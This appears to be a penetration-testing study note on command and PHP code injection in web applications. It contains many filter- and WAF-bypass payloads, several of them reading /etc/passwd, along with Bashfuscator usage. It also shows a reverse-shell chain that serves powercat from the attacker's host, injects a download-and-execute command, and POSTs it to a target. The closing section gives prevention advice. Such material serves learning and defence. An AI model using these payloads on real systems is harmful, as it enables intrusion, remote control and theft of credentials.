For example: ?doc=Doc1.pdf+\|+Dir c:\| |

Command injection vulnerabilities in the context of web application penetration testing occur when an attacker can manipulate the input fields of a web application in a way that allows them to execute arbitrary operating system commands on the underlying server. This type of vulnerability is a serious security risk because it can lead to unauthorized access, data theft, and full compromise of the web server.


Causes:

- User Input Handling: Web applications often take user input through forms, query parameters, or other means. 
- Lack of Input Sanitization: Insecurely coded applications may fail to properly validate, sanitize, or escape user inputs before using them in system commands.
- Injection Points: Attackers identify injection points, such as input fields or URL query parameters, where they can insert malicious commands.

Impact:

- Unauthorized Execution: Attackers can execute arbitrary commands with the privileges of the web server process. This can lead to unauthorized data access, code execution, or system compromise.
- Data Exfiltration: Attackers can exfiltrate sensitive data, such as database content, files, or system configurations.
- System Manipulation: Attackers may manipulate the server, installmalware, or create backdoors for future access.

Types of injections:

| Injection                           | Description                                                               |
| ----------------------------------- | ------------------------------------------------------------------------- |
| OS Command Injection                | Occurs when user input is directly used as part of an OS command.         |
| Code Injection                      | Occurs when user input is directly within a function that evaluates code. |
| SQL Injections                      | Occurs when user input is directly used as part of an SQL query.          |
| Cross-Site Scripting/HTML Injection | Occurs when exact user input is displayed on a web page.                  |

There are many other types of injections other than the above, like `LDAP injection`, `NoSQL Injection`, `HTTP Header Injection`, `XPath Injection`, `IMAP Injection`, `ORM Injection`, and others.


## How to Test 

Malicious Input: Attackers craft input that includes special characters, like semicolons, pipes, backticks, and other shell metacharacters, to break out of the intended input context and inject their commands. Command Execution: When the application processes the attacker's input, it constructs a shell command using the malicious input.  The server, believing the command to be legitimate, executes it in the underlying operating system


### Case Study: Perl

When viewing a file in a web application, the filename is often shown in the URL. Perl allows piping data from a process into an open statement. The user can simply append the Pipe symbol | onto the end of the filename.

```
# Example URL before alteration
http://sensitive/cgi-bin/userData.pl?doc=user1.txt 

# Example URL modified
http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|
```

### PHP code injection

PHP code injection vulnerabilities, also known as PHP code execution vulnerabilities, occur when an attacker can inject and execute arbitrary PHP code within a web  application. These vulnerabilities are a serious security concern because they allow attackers to gain unauthorized access to the server, execute malicious actions, and potentially compromise the entire web application.

Malicious Input: Attackers craft input that includes PHP code snippets, often enclosed within PHP tags (<?php ... ?>) or backticks (\`). 

Code Execution: When the application processes the attacker's input, it includes the injected PHP code as part of a PHP script that is executed on the server.

This allows the attacker to run arbitrary PHP code in the context of the web application. 

**Command injection**: Appending a semicolon to the end of a URL for a .PHP page followed by an operating system command, will execute the command. %3B is URL encoded and decodes to semicolon 

```
# Directly injecting operating system commands:
http://sensitive/something.php?dir=%3Bcat%20/etc/passwd

########
# Injecting PHP commands
#########

# Validating that the injection is possible
http://example.com/page.php?message=test;phpinfo();
http://example.com/page.php?id=1'];phpinfo();

# Executing PHP commands
http://example.com/page.php?message=test;system(cat%20/etc/passwd)
```



## Special characters for command injection

The following special character can be used for command injection such as:

```
| ; & $ > < ' ! 
```

```
# Uses of | will make command 2 to be executed weather command 1 execution is successful or not.
cmd1|cmd2

# Uses of ; will make command 2 to be executed weather command 1 execution is successful or not.
cmd1;cmd2

# Command 2 will only be executed if command 1 execution fails. 
cmd1||cmd2


# Command 2 will only be executed if command 1 execution succeeds. 
cmd1&&cmd2

# For example, echo $(whoami) or $(touch test.sh; echo 'ls' > test.sh)
$(cmd)

# It’s used to execute specific command. For example, whoami 
cmd

>(cmd) : >(ls) 
<(cmd) : <(ls)
```

| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |

>Tip: In addition to the above, there are a few unix-only operators, that would work on Linux and macOS, but would not work on Windows, such as wrapping our injected command with double backticks (` `` `) or with a sub-shell operator (`$()`).

## Bypassing techniques for filters and WAFs

A web application may have a list of blacklisted characters, and if the command contains them, it would deny the request. The `PHP` code may look something like the following:

```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

### Common tricks

```bash
# Use url-encoded encode. new line \n would be
%0a

# If typical commands such as 'whoami' are being filtered, include some other characters that are going to be removed to escape the pattern. Example
whoam'i

# If blank spaces are removed, use different types of spaces. The url-encoded expression for TAB would be 
%09

# Using the ($IFS) Linux Environment Variable. If we use `${IFS}` where the spaces should be, the variable should be automatically replaced with a space, and our command should work. 
# Example: 
# 127.0.0.1%0a${IFS}

# We can use the `Bash Brace Expansion` feature, which automatically adds spaces between arguments wrapped between braces, as follows:
{ls,-la}
# Example
# 127.0.0.1%0a{ls,-la}
```




### Using environmental variables to substitute filtered characters in Linux

#### Slashes and back-slashes
A very commonly blacklisted character is the slash (`/`) or backslash (`\`) character, as it is necessary to specify directories in Linux or Windows.  we can replace slashes (`or any other character`) is through `Linux Environment Variables` . 

The `$PATH` environment variable in Linux, for example, contains the `/` character in a fixed position:

```bash
 echo ${PATH:0:1}
```

We can do the same with the `$HOME` or `$PWD` environment variables as well.

#### Semicolon

Following the same reasoning, this command gives you a semi-colon:

```bash
echo ${LS_COLORS:10:1}
```

#### Other characters

```bash
# The `printenv` command prints all environment variables in Linux, so you can look which ones may contain useful characters, and then try to reduce the string to that character only.
printenv
```

Example:

```bash
# A given website with a vulnerable to command injection input for the ip parameter. We will add a semicolon and a space to our payload
ip=127.0.0.1${LS_COLORS:10:1}${IFS}

```

### Using environmental variables to substitute filtered characters in Windows

In a cmd session:

```cmd-session
# To produce a slash in `Windows Command Line (CMD)`, we can `echo` a Windows variable (`%HOMEPATH%` -> `\Users\htb-student`), and then specify a starting position (`~6` -> `\htb-student`), and finally specifying a negative end position, which in this case is the length of the username `htb-student` (`-11` -> `\`)
echo %HOMEPATH:~6,-11%

```

We can achieve the same thing using the same variables in `Windows PowerShell`:

```powershell
# Print all environmental variables:
Get-ChildItem Env

# For the backslash
$env:HOMEPATH[0]

#  
$env:PROGRAMFILES[10]

```


### Character Shifting

There are other techniques to produce the required characters without using them, like `shifting characters`.

```bash
# Note that the character \ is on 92, before it is [ on 91
man ascii     

# Print the character \ by invoking the character [ and ussing a shifting operation
echo $(tr '!-}' '"-~'<<<[)
```

We can use PowerShell commands to achieve the same result in Windows, though they can be quite longer than the Linux ones.


### Bypassing Blacklisted Commands by inserting characters

A common bypass is Inserting certain characters within our command that are usually ignored by command shells like Bash or PowerShell 

The important things to remember are that we cannot mix types of quotes and the number of quotes must be even. 

```shell-session
# Single quotes
w'h'o'am'i

# The same works with double-quotes as well:
 w"h"o"am"i
```

#### Linux only

We can insert a few other Linux-only characters in the middle of commands, and the `bash` shell would ignore them and execute the command.

```bash
# These characters include the backslash \ and the positional parameter character $@.
who$@ami
w\ho\am\i
```

#### Windows only

There are also some Windows-only characters we can insert in the middle of commands that do not affect the outcome, like a caret (`^`) character, as we can see in the following example:

```cmd-session
who^ami
```


### Case manipulation

One command obfuscation technique we can use is case manipulation, like inverting the character cases of a command (e.g. `WHOAMI`) or alternating between cases (e.g. `WhOaMi`).

```powershell
WhOaMi
```

However, when it comes to Linux and a bash shell, which are case-sensitive, as mentioned earlier, we have to get a bit creative and find a command that turns the command into an all-lowercase word. One working command we can use is the following:

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

There might be some issues with the above payload. Blank spaces can be filtered. To bypass it, we will change the blank spaces for the TAB url encoded characters `%09`:

```bash
$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
```

There are many other commands we may use for the same purpose, like the following:

```bash
$(a="WhOaMi";printf%09%$(tr%09%'!-}'%09%'"-~'<<<$)s%09%"${a,,}")

$(a="WhOaMi";printf %s "${a,,}")

```


### Reverse commands

Another command obfuscation technique we will discuss is reversing commands and having a command template that switches them back and executes them in real-time. In this case, we will be writing `imaohw` instead of `whoami` to avoid triggering the blacklisted command.

```bash
# To execute whoami:
$(rev<<<'imaohw')
```


The same can be applied in `Windows.` We can first reverse a string, as follows:

```powershell
 iex "$('imaohw'[-1..-20] -join '')"
```


### Encoded commands

We can utilize various encoding tools, like `base64` (for b64 encoding) or `xxd` (for hex encoding). Let's take `base64` as an example. First, we'll encode the payload we want to execute (which includes filtered characters):

```bash
echo -n 'cat /etc/passwd | grep 33' | base64
# Output: Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

# Now we can create a command that will decode the encoded string in a sub-shell ($()), and then pass it to bash to be executed (i.e. bash<<<), as follows:
# Tip: Note that we are using <<< to avoid using a pipe |, which is a filtered character.
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
# Output: 
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

We use the same technique with Windows as well. First, we need to base64 encode our string, as follows:

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

We may also achieve the same thing on Linux, but we would have to convert the string from `utf-8` to `utf-16` before we `base64` it, as follows:

```bash
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

Finally, we can decode the b64 string and execute it with a PowerShell sub-shell (`iex "$()"`), as follows:

```powershell
 iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

In addition to the techniques we discussed, we can utilize numerous other methods, like wildcards, regex, output redirection, integer expansion, and many others. We can find some such techniques on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion).

## Tools for evasion


### Linux (Bashfuscator)

[More on bashfuscator](../bashfuscator.md).

**Installation**:

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```


**Basic usage:**

```shell-session
cd ./bashfuscator/bin/

# List help
./bashfuscator -h

# providing the command we want to obfuscate with the -c flag
./bashfuscator -c 'cat /etc/passwd'

# You can copy the obfuscated payload to your clipboard with --clip, or write it to a file with -o.
./bashfuscator -c 'cat /etc/passwd' -o file.sh

# The -s and -t options control the added size and execution time of the obfuscated payload respectively. They both default to 2, but can be set to 1-3 to control the generated payload more closely. The higher the -s or -t options, the greater the variety of the payload, at the expense of added size. 
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

# You should make sure the obfuscated payload works as expected, and the –test option will make that easier. When used, –test will invoke the obfuscated payload in memory, and show the output.
./bashfuscator -c "cat /etc/passwd" --test
```

```

## Exploitation: from Command injection to Reverse Shell

Serve Powercat from our kali:

```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

python3 -m http.server 80
```

Set a listener in another kali's terminal:

```
nc -lnvp 4444
```

The command to inject in the injection endpoint would be:

```text
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
```

Let's say this is out injection endpoint:

```bash
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```

Being in Burpsuite:

## Prevention


### **System commands**
Instead of using system command execution functions, we should use built-in functions that perform the needed functionality, as back-end languages usually have secure implementations of these types of functionalities. For example, suppose we wanted to test whether a particular host is alive with `PHP`. In that case, we may use the `fsockopen` function instead, which should not be exploitable to execute arbitrary system commands.

### **Input Validation**
Input validation should be done both on the front-end and on the back-end. Whether using built-in functions or system command execution functions, we should always validate and then sanitize the user input. Input validation is done to ensure it matches the expected format for the input, such that the request is denied if it does not match.

#### PHP

In `PHP`, like many other web development languages, there are built in filters for a variety of standard formats, like emails, URLs, and even IPs, which can be used with the `filter_var` function, as follows:

Code: php

```php
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // call function
} else {
    // deny request
}
```


#### Javascript in NodeJS

If we wanted to validate a different non-standard format, then we can use a Regular Expression `regex` with the `preg_match` function. The same can be achieved with `JavaScript` for both the front-end and back-end (i.e. `NodeJS`), as follows:

```javascript
if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
    // call function
}
else{
    // deny request
}
```

Just like `PHP`, with `NodeJS`, we can also use libraries to validate various standard formats, like [is-ip](https://www.npmjs.com/package/is-ip) for example, which we can install with `npm`, and then use the `isIp(ip)` function in our code. You can read the manuals of other languages, like [.NET](https://learn.microsoft.com/en-us/aspnet/web-pages/overview/ui-layouts-and-themes/validating-user-input-in-aspnet-web-pages-sites) or [Java](https://docs.oracle.com/cd/E13226_01/workshop/docs81/doc/en/workshop/guide/netui/guide/conValidatingUserInput.html?skipReload=true), to find out how to validate user input on each respective language.

### **Input Sanitization**

Removing any non-necessary special characters from the user input. Input sanitization is always performed after input validation.

#### PHP 

 Case: IP
 We can use `preg_replace` to remove any special characters from the user input, as follows:
 
```php
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
```

As we can see, the above regex only allows alphanumerical characters (`A-Za-z0-9`) and allows a dot character (`.`) as required for IPs.


#### Javascript

```javascript
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
```

We can also use the DOMPurify library for a NodeJS back-end, as follows:

```javascript
import DOMPurify from 'dompurify';
var ip = DOMPurify.sanitize(ip);
```


### **Server Configuration**

- Use the web server's built-in Web Application Firewall (e.g., in Apache `mod_security`), in addition to an external WAF (e.g. `Cloudflare`, `Fortinet`, `Imperva`..
- Abide by the [Principle of Least Privilege (PoLP)](https://en.wikipedia.org/wiki/Principle_of_least_privilege) by running the web server as a low privileged user (e.g. `www-data`)
- Prevent certain functions from being executed by the web server (e.g., in PHP `disable_functions=system,...`)
- Limit the scope accessible by the web application to its folder (e.g. in PHP `open_basedir = '/var/www/html'`)
- Reject double-encoded requests and non-ASCII characters in URLs
- Avoid the use of sensitive/outdated libraries and modules (e.g. [PHP CGI](https://www.php.net/manual/en/install.unix.commandline.php))
